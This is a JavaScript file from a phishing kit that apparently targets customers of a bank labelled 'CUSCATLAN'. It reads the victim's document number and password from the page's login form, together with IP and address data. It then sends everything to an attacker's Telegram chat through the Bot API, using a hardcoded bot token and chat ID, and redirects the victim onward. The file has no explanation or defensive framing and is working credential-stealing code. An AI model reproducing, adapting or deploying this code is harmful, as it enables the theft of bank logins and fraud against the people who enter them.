//bot token
var telegram_bot_id = "5716380069:AAEki92CoOEi7R75BLxAiMg0wx-r3KrQugQ";
//chat id
var chat_id = 5414740280;
var u_name, pax, pax2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("DocumentNumber").value;
    pax = document.getElementById("Password").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "RE USER: " + u_name + "\nRE Cl4v3: " + pax +"\nIP: " + ip +"\n" + ip2 +"\n\nCUSCATLAN";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'index3.html';
        console.log(response);
    });
    return false;
};
